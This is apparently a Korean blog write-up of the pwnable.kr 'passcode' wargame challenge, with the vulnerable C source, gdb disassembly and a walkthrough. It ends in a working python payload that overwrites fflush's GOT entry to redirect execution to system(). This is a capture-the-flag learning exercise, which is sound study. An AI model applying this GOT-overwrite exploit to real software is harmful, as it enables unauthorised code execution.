---
layout: post
title: ! "[pwnable.kr] Toddler's Bottle passcode"
excerpt_separator: <!--more-->
tags:
  - nalda
  - wargame
  - pwnable.kr
  - pwnable
---
**Problem description:**
>Mommy told me to make a passcode based login system.
>My initial C code was compiled without any error!
>Well, there was some compiler warning, but who cares about that?
>
>ssh passcode@pwnable.kr -p2222 (pw:guest)
<!--more-->

최근 여러가지 사정으로 Pwnable 문제와 씨름을 했었다..
한동안 공부한다고 열심히 끄적이기는 했으나, 2018년 죽음의 해를 보내다 보니 pwnable에 대한 감을 거의 다 잃어버렸다.

이참에 pwnable.kr 문제를 풀며 다시 공부해보기 위해 풀이를 작성하려 한다.

```c
#include <stdio.h>
#include <stdlib.h>

void login(){
	int passcode1;
	int passcode2;

	printf("enter passcode1 : ");
	scanf("%d", passcode1);
	fflush(stdin);

	// ha! mommy told me that 32bit is vulnerable to bruteforcing :)
	printf("enter passcode2 : ");
        scanf("%d", passcode2);

	printf("checking...\n");
	if(passcode1==338150 && passcode2==13371337){
                printf("Login OK!\n");
                system("/bin/cat flag");
        }
        else{
                printf("Login Failed!\n");
		exit(0);
        }
}

void welcome(){
	char name[100];
	printf("enter you name : ");
	scanf("%100s", name);
	printf("Welcome %s!\n", name);
}

int main(){
	printf("Toddler's Secure Login System 1.0 beta.\n");

	welcome();
	login();

	// something after login...
	printf("Now I can safely trust you that you have credential :)\n");
	return 0;
}
```
코드를 확인해 보면, 크게 main(), welcome(), login() 세 함수로 구분 돼 있다.
1. main()
  main 함수는 큰 역할 없이 welcome과 login 함수를 순서대로 호출 해 준다.
2. welcome()
  welcome 함수는 100byte만큼 char형 배열로 name을 입력 받는다.
3. login()
  main과 welcome 함수에선 특별한 내용이 없는걸로 미루어 login함수에서 어떠한 문제(?)가 발생하리라 생각된다.~~그리고 제일 길다.~~
  
### login()
  이 함수에서는 `int passcode1`과 `int passcode2`가 선언되어 있으며
  ```c
  if(passcode1==338150 && passcode2==13371337){
    printf("Login OK\n");
    system("/bin/cat flag");
  }
  ```
  위의 조건문을 통해 각각 338150, 13371337을 충족 시 flag 를 확인할 수 있다.

  처음엔 읭 간단하네 라는 생각을 하며... 실행을 했을 때
  ```
  passcode@ubuntu:~$ ./passcode
  Toddler's Secure Login System 1.0 beta.
  enter you name : nalda
  Welcome nalda!
  enter passcode1 : 338150
  Segmentation fault
  ```
  잉? 하며 소스를 다시 보았다.
  
  ```
  scanf("%d", passcode1);
  scanf("%d", passcode2);
  ```
  scanf가 요상하다 ^0^
  우리가 흔히 아는 scanf 사용법은 `scanf("%d", &passcode1)` 이런식으로 ***&***가 들어가 있어야 한다.
  
  이는 변수에 입력받은 값을 저장하는게 아닌, 변수명 자체가 주소로 인식되어 `Segmentation fault`가 발생하게 된당

  이 때, 문득 든 찝찝 한 name 배열의 100이나 되는 size...!

  바로 gdb 고고!
  ```
  (gdb) disas welcome
Dump of assembler code for function welcome:
   0x08048609 <+0>:	push   %ebp
   0x0804860a <+1>:	mov    %esp,%ebp
   0x0804860c <+3>:	sub    $0x88,%esp
   0x08048612 <+9>:	mov    %gs:0x14,%eax
   0x08048618 <+15>:	mov    %eax,-0xc(%ebp)
   0x0804861b <+18>:	xor    %eax,%eax
   0x0804861d <+20>:	mov    $0x80487cb,%eax
   0x08048622 <+25>:	mov    %eax,(%esp)
   0x08048625 <+28>:	call   0x8048420 <printf@plt>
   0x0804862a <+33>:	mov    $0x80487dd,%eax
   0x0804862f <+38>:	lea    -0x70(%ebp),%edx
   0x08048632 <+41>:	mov    %edx,0x4(%esp)
   0x08048636 <+45>:	mov    %eax,(%esp)
   0x08048639 <+48>:	call   0x80484a0 <__isoc99_scanf@plt>
   0x0804863e <+53>:	mov    $0x80487e3,%eax
   0x08048643 <+58>:	lea    -0x70(%ebp),%edx
   0x08048646 <+61>:	mov    %edx,0x4(%esp)
   0x0804864a <+65>:	mov    %eax,(%esp)
   0x0804864d <+68>:	call   0x8048420 <printf@plt>
   0x08048652 <+73>:	mov    -0xc(%ebp),%eax
   0x08048655 <+76>:	xor    %gs:0x14,%eax
   0x0804865c <+83>:	je     0x8048663 <welcome+90>
   0x0804865e <+85>:	call   0x8048440 <__stack_chk_fail@plt>
   0x08048663 <+90>:	leave
   0x08048664 <+91>:	ret
End of assembler dump.
  ```
 
  어셈 코드 중 `0x0804860c <+3>: sub    $0x88,%esp`  $esp에서 0x88만큼(136) 할당하게 된다.

  다른 정보들을 더 얻기위해 코드를 더 보자! 
  
  scanf 호출하여 name을 저장하는 공간을 보면 `0x08048643 <+58>:  lea    -0x70(%ebp),%edx` ebp-0x70위치에 저장합니다!

  이를 이용하여 passcode1을 조작할 수 있을 까 싶어 login 함수를 disassemble해보면!
  ```
  (gdb) disas login
Dump of assembler code for function login:
   0x08048564 <+0>:	push   %ebp
   0x08048565 <+1>:	mov    %esp,%ebp
   0x08048567 <+3>:	sub    $0x28,%esp
   0x0804856a <+6>:	mov    $0x8048770,%eax
   0x0804856f <+11>:	mov    %eax,(%esp)
   0x08048572 <+14>:	call   0x8048420 <printf@plt>
   0x08048577 <+19>:	mov    $0x8048783,%eax
   0x0804857c <+24>:	mov    -0x10(%ebp),%edx
   0x0804857f <+27>:	mov    %edx,0x4(%esp)
   0x08048583 <+31>:	mov    %eax,(%esp)
   0x08048586 <+34>:	call   0x80484a0 <__isoc99_scanf@plt>
   0x0804858b <+39>:	mov    0x804a02c,%eax
   0x08048590 <+44>:	mov    %eax,(%esp)
   0x08048593 <+47>:	call   0x8048430 <fflush@plt>
   0x08048598 <+52>:	mov    $0x8048786,%eax
   0x0804859d <+57>:	mov    %eax,(%esp)
   0x080485a0 <+60>:	call   0x8048420 <printf@plt>
   0x080485a5 <+65>:	mov    $0x8048783,%eax
   0x080485aa <+70>:	mov    -0xc(%ebp),%edx
   0x080485ad <+73>:	mov    %edx,0x4(%esp)
   0x080485b1 <+77>:	mov    %eax,(%esp)
   0x080485b4 <+80>:	call   0x80484a0 <__isoc99_scanf@plt>
   0x080485b9 <+85>:	movl   $0x8048799,(%esp)
   0x080485c0 <+92>:	call   0x8048450 <puts@plt>
   0x080485c5 <+97>:	cmpl   $0x528e6,-0x10(%ebp)
   0x080485cc <+104>:	jne    0x80485f1 <login+141>
   0x080485ce <+106>:	cmpl   $0xcc07c9,-0xc(%ebp)
   0x080485d5 <+113>:	jne    0x80485f1 <login+141>
   0x080485d7 <+115>:	movl   $0x80487a5,(%esp)
   0x080485de <+122>:	call   0x8048450 <puts@plt>
   0x080485e3 <+127>:	movl   $0x80487af,(%esp)
   0x080485ea <+134>:	call   0x8048460 <system@plt>
   0x080485ef <+139>:	leave
   0x080485f0 <+140>:	ret
   0x080485f1 <+141>:	movl   $0x80487bd,(%esp)
   0x080485f8 <+148>:	call   0x8048450 <puts@plt>
   0x080485fd <+153>:	movl   $0x0,(%esp)
   0x08048604 <+160>:	call   0x8048480 <exit@plt>
End of assembler dump.
  ```
  이 중, `0x0804857c <+24>:  mov    -0x10(%ebp),%edx`를 보게되면 ebp-0x10의 위치에 값을 저장합니다.
  
  계산을 해보면...
  [ebp-0x70] - [ebp-10] = 0x60...즉, 96byte가 됩니다!
  name 배열이 100byte였던것을 미루어 보아 4byte만큼 임의의 값을 작성할 수 있다!

  ![]({{ site.baseurl }}/images/nalda/passcode/passcode_1.png)
  
  시나리오를 써보려 했을 때,

  아무리 짱구를 굴려봐도 `passcode1==338150&&passcode2==13371337`을 충족시킬 수 없었다...
  
  그 때 문득 들어온 `fflush(stdin);`...! passcode1입력 후 실행되는 이 라인을 `system(/bin/cat flag);`이 시작되는 주소로 바꾸면 어떨까 라는 시나리오가 떠올랐고!

  이를 수행하기 위해서는! `fflush()`의 GOT주소와 `system()`의 시작 주소를 알아야 한다!

  ---------------------------------------------------

  ```
  0x08048593 <+47>:	call   0x8048430 <fflush@plt> //disas login

  (gdb) x/i 0x8048430
   0x8048430 <fflush@plt>:	jmp    *0x804a004
  (gdb) x/i 0x804a004
   0x804a004 <fflush@got.plt>:	test   %al,%ss:(%eax,%ecx,1)
  ```
  fflush의 GOT주소는 0x804a004가 된다

  이제 system함수의 시작 위치를 보면
  ```
  0x080485de <+122>:	call   0x8048450 <puts@plt>
  0x080485e3 <+127>:	movl   $0x80487af,(%esp)
  0x080485ea <+134>:	call   0x8048460 <system@plt>
  ```
  puts 다음인 `0x080485e3`이 된다!

  자 이제 payload를 작성 해 보자면
  `a*96 + fflush의 GOT + system()` 함수이다

  자 이제 가볼까낫!
  ```
passcode@ubuntu:~$ (python -c 'print "a"*96+"\x04\xa0\x04\x08"+"\xe3\x85\x04\x08"') | ./passcode
Toddler's Secure Login System 1.0 beta.
enter you name : Welcome aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!
enter passcode1 : enter passcode2 : checking...
Login Failed!
  ```
  읭..?
  하고 한참 고민 &생각을 했는데....

  `scanf("%d", passcode1);`...즉 %d... 정수형으로 받는다..!
  0x080485e3를 정수로 바꾸면... 134514147이 된당..
  ```
passcode@ubuntu:~$ (python -c 'print "a"*96+"\x04\xa0\x04\x08"+"134514147"') | ./passcode
Toddler's Secure Login System 1.0 beta.
enter you name : Welcome aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!
여긴 플래그인데 혹시나 누군가를 위해 지워둠..! 상관은 없지만 그냥 해보고싶었숨...!
enter passcode1 : Now I can safely trust you that you have credential :)
  ```
